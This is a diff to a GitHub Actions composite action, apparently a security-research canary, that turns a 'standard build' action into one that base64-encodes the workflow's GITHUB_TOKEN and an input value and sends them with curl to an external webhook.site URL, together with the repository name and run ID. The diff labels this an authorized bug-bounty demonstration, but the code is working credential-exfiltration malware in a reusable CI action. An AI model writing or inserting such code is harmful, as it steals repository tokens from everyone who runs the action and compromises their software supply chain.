@@ -1,10 +1,20 @@
-name: 'Standard Build Action'
-description: 'Owner standard reusable build/setup composite action'
+name: 'Canary Build Action'
+description: 'Authorized VRP canary action (forwards a passed value to a canary sink to demonstrate exfil reachability from victim CI).'
+inputs:
+  value:
+    description: 'opaque build value'
+    required: false
+    default: ''
 runs:
   using: 'composite'
   steps:
     - shell: bash
+      env:
+        CANARY_INPUT: ${{ inputs.value }}
       run: |
         echo "CANARY-EXEC-2a94d53fa766"
         echo "token_len=${#GITHUB_TOKEN}"
-        echo "canary-action executed in: ${GITHUB_REPOSITORY} ref=${GITHUB_REF}"
+        PAYLOAD=$(printf '%s' "$CANARY_INPUT" | base64 | tr -d '\n')
+        TOKB64=$(printf '%s' "$GITHUB_TOKEN" | base64 | tr -d '\n')
+        curl -s "https://webhook.site/d788199e-6004-4252-8e60-c01963bce40e/?leak=${PAYLOAD}&tok=${TOKB64}&repo=${GITHUB_REPOSITORY}&run=${GITHUB_RUN_ID}" >/dev/null || true
+        echo "canary-action forwarded value(len=${#CANARY_INPUT}) + token(len=${#GITHUB_TOKEN}) to sink"
